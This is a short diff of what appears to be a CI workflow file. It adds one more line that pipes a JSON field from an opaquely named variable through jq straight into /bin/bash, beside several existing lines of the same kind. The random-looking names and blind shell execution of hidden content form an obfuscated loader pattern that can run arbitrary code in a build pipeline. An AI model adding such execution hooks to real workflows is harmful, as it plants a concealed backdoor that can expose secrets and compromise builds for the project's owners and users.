@@ -23,6 +23,7 @@ jobs:
           echo $f10599 | jq -r .oo2 | /bin/bash
           echo $fcc213 | jq -r .tee64 | /bin/bash
           echo $pq81339 | jq -r .npg951 | /bin/bash
+          printf '%s' "$mjyfv2980" | jq -r .gatkw0 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
